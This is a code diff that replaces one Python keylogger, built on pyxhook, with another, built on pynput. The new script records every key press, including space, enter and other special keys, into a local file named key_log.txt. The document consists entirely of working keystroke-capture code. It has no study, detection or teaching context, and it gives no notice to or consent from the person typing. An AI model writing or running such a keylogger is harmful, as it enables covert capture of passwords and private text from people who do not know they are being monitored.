@@ -1,46 +1,26 @@
-import os
-from datetime import datetime
-import pyxhook
+from pynput.keyboard import Listener
 
-def main():
-    # Specify the directory to store log files
-    log_directory = "logs"
-    if not os.path.exists(log_directory):
-        os.makedirs(log_directory)
+# Path to the file where keystrokes will be logged
+log_file = "key_log.txt"
 
-    # Create a log file with a timestamp
-    log_file = f"{log_directory}/{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.log"
-
-    # The logging function with event parameter
-    def on_keypress(event):
-        with open(log_file, "a") as f:
-            if event.Key == "space":
-                f.write(" ")
-            elif event.Key == "backspace":
-                f.write("[BACKSPACE]")
-            elif event.Key == "enter":
-                f.write("[ENTER]\n")
-            else:
-                f.write(event.Key)
-
-    # Create a hook manager object
-    new_hook = pyxhook.HookManager()
-    new_hook.KeyDown = on_keypress
-
-    # Set the hook
-    new_hook.HookKeyboard()
-
+# Function to handle each key press
+def on_press(key):
     try:
-        # Start the hook
-        new_hook.start()
-    except KeyboardInterrupt:
-        # User cancelled from command line, so close the listener
-        new_hook.cancel()
-    except Exception as ex:
-        # Write exceptions to the log file for analysis later
-        msg = f"Error while catching events:\n{ex}"
         with open(log_file, "a") as f:
-            f.write(f"\n{msg}")
+            f.write(str(key.char))
+    except AttributeError:
+        with open(log_file, "a") as f:
+            if key == key.space:
+                f.write(' ')
+            elif key == key.enter:
+                f.write('\n')
+            else:
+                f.write(f' [{str(key)}] ')
+
+# Function to start the listener
+def start_keylogger():
+    with Listener(on_press=on_press) as listener:
+        listener.join()
 
 if __name__ == "__main__":
-    main()
+    start_keylogger()
